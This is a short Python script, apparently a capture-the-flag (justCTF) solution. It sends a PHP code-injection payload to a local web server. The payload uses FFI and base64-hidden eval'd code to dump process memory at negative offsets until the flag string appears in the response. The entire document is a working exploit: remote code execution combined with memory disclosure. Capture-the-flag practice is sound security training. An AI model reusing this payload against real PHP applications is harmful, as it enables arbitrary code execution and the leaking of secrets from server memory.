import requests

payload = '$x=FFI::new("long[10]");eval(base64_decode("d2hpbGUoMSkgeyAKCXZhcl9kdW1wKEZGSTo6c3RyaW5nKEZGSTo6YWRkcigkeClbLSRpXSw2NCkpOyAkaSsrOwp9"));'

for l in requests.get('http://127.0.0.1:8010/?x='+payload).text.split():
	if 'justCTF' in l:
		print(l)
